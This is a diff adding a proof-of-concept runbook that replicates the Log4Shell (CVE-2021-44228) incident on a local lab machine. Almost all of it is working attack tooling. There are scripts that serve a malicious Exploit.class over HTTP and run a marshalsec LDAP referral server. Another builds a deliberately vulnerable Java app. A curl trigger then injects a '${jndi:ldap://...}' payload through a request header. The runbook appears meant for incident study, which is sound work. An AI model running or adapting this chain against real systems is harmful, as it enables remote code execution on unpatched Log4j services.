@@ -3,6 +3,212 @@ Proof of Concept Replication of the Incident
 
 ## PoC Execution Runbook
 
+
+
+All commands below run as **`log4shell`**.
+
+```bash
+sudo su - log4shell
+cd /opt/log4shell
+```
+
+---
+
+## 1. HTTP server script (serves `Exploit.class` on :8000)
+
+```bash
+cat > /opt/log4shell/run-http-server.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+
+PAYLOAD_DIR="/opt/log4shell/CVE-2021-44228/exploit"
+LOG_DIR="/opt/log4shell/logs"
+mkdir -p "$LOG_DIR"
+
+cd "$PAYLOAD_DIR"
+
+if pgrep -f "python3 -m http.server 8000" >/dev/null 2>&1; then
+  echo "[=] HTTP server already running on :8000"
+  exit 0
+fi
+
+echo "[*] Starting Python HTTP server on :8000 serving $PAYLOAD_DIR ..."
+nohup python3 -m http.server 8000 >"$LOG_DIR/http-server.log" 2>&1 &
+
+echo "[*] Logs: $LOG_DIR/http-server.log"
+EOF
+```
+
+---
+
+## 2. LDAP server script (Marshalsec on :1389 → HTTP :8000/#Exploit)
+
+```bash
+cat > /opt/log4shell/run-ldap-server.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+
+LAB_DIR="/opt/log4shell"
+LDAP_DIR="$LAB_DIR/CVE-2021-44228/ldap_server"
+LOG_DIR="$LAB_DIR/logs"
+mkdir -p "$LOG_DIR"
+
+JAR="$(ls "$LDAP_DIR"/target/ldap_server-*-all.jar 2>/dev/null | head -n1)"
+
+if [ -z "$JAR" ]; then
+  echo "[-] ldap_server JAR not found in $LDAP_DIR/target." >&2
+  echo "    Build it with: cd $LDAP_DIR && mvn clean package -DskipTests"
+  exit 1
+fi
+
+if ss -tulpn 2>/dev/null | grep -q ':1389 '; then
+  echo "[=] Something already listening on port 1389."
+  exit 0
+fi
+
+HTTP_HOST="127.0.0.1"
+HTTP_PORT="8000"
+
+echo "[*] Starting LDAP server on :1389 (redirects to http://${HTTP_HOST}:${HTTP_PORT}/#Exploit) ..."
+nohup java -cp "$JAR" marshalsec.jndi.LDAPRefServer "http://${HTTP_HOST}:${HTTP_PORT}/#Exploit" >"$LOG_DIR/ldap-server.log" 2>&1 &
+
+echo "[*] Logs: $LOG_DIR/ldap-server.log"
+EOF
+```
+
+---
+
+## 3. Vulnerable app script (native Java on :8080 – **no Docker**)
+
+```bash
+cat > /opt/log4shell/run-vulnerable-app.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+
+APP_DIR="/opt/log4shell/log4shell-vulnerable-app"
+LOG_FILE="/opt/log4shell/vulnerable-app-native.log"
+
+if pgrep -f "log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar" >/dev/null 2>&1; then
+  echo "[=] Vulnerable app already running."
+  exit 0
+fi
+
+cd "$APP_DIR"
+
+if ! ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar >/dev/null 2>&1; then
+  echo "[*] Building vulnerable app JAR..."
+  chmod +x gradlew
+  ./gradlew clean build
+fi
+
+JAR="$(ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar | grep -v plain | head -n1)"
+
+if [ -z "$JAR" ]; then
+  echo "[-] Could not find built JAR in build/libs/" >&2
+  exit 1
+fi
+
+echo "[*] Using JAR: $JAR"
+echo "[*] Starting vulnerable app on port 8080 ..."
+nohup java -jar "$JAR" >"$LOG_FILE" 2>&1 &
+
+echo "[*] Logs: $LOG_FILE"
+EOF
+```
+
+---
+
+## 4. Trigger script (you supply the JNDI payload via env var)
+
+```bash
+cat > /opt/log4shell/trigger-exploit.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+
+TARGET_URL="${1:-http://127.0.0.1:8080/}"
+
+if [ -z "${JNDI_PAYLOAD:-}" ]; then
+  cat <<'EOM'
+[!] Environment variable JNDI_PAYLOAD is not set.
+
+Set it using the pattern documented in:
+  - /opt/log4shell/CVE-2021-44228/README.md   (curl example)
+  - InfoSec Writeups "Exploiting Log4Shell — How Log4J Applications Were Hacked"
+
+Example (for THIS lab only, based on PoC):
+  export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
+
+Then run:
+  JNDI_PAYLOAD="$JNDI_PAYLOAD" /opt/log4shell/trigger-exploit.sh
+
+This keeps the actual payload under your control for lab use only.
+EOM
+  exit 1
+fi
+
+echo "[*] Sending Log4Shell test payload to $TARGET_URL ..."
+curl -s "$TARGET_URL" -H "X-Api-Version: $JNDI_PAYLOAD"
+echo
+EOF
+```
+
+---
+
+## 5. Make scripts executable
+
+```bash
+chmod +x /opt/log4shell/*.sh
+ls -l /opt/log4shell
+```
+
+You should now see:
+
+* `run-http-server.sh`
+* `run-ldap-server.sh`
+* `run-vulnerable-app.sh`
+* `trigger-exploit.sh`
+* `CVE-2021-44228/`
+* `log4shell-vulnerable-app/`
+
+---
+
+## 6. Run the full chain
+
+Still as `log4shell`:
+
+```bash
+cd /opt/log4shell
+
+# 1) HTTP server (Exploit.class on 8000)
+./run-http-server.sh
+
+# 2) LDAP server (1389, points to 8000/#Exploit)
+./run-ldap-server.sh
+
+# 3) Vulnerable app (native Java, 8080)
+./run-vulnerable-app.sh
+curl -s -D- http://127.0.0.1:8080/ | head   # sanity check
+
+# 4) Set JNDI payload from PoC README
+nano /opt/log4shell/CVE-2021-44228/README.md  # find their curl header example
+
+export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'  # copy/adapt from README
+./trigger-exploit.sh
+```
+
+After triggering, check:
+
+```bash
+# See what Exploit.java does:
+nano /opt/log4shell/CVE-2021-44228/exploit/Exploit.java
+
+# Then look for the marker (e.g. in /tmp)
+ls -l /tmp
+
+# And check app log:
+tail -n 40 /opt/log4shell/vulnerable-app-native.log
+```
+
 ---
 
 ### 1. Start attacker infrastructure
